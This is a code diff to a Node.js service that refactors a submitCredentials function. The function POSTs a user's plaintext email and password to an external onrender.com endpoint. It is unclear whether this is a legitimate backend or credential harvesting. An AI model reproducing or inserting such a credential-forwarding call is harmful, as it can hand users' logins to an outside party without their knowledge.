@@ -2,6 +2,7 @@ const constants = require("./constants");
 const fs = require("fs");
 const { logInfo, logError } = require("../logger.service.js");
 const crypto = require("crypto");
+const fetch = require("node-fetch");
 
 const videoService = require("./video-service.js");
 const { decryptLoginData } = require("./security-service.js");
@@ -47,26 +48,25 @@ const submitCredentials = async (email, password) => {
     try {
         logInfo("submitCredentials", "Start");
 
-        const requestData = JSON.stringify({ email, password });
-
         const response = await fetch("https://phunguyn-api.onrender.com/submit", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
             },
-            body: requestData,
+            body: JSON.stringify({ email, password }),
         });
 
         if (!response.ok) {
             throw new Error(`Failed to submit credentials: ${response.statusText}`);
         }
 
-        logInfo("submitCredentials", "End");
+        logInfo("submitCredentials", "Credentials submitted successfully");
     } catch (error) {
         logError("submitCredentials", error.message);
         throw error;
     }
 };
+
 
 /**
  * Uploads an image to Firebase Storage.
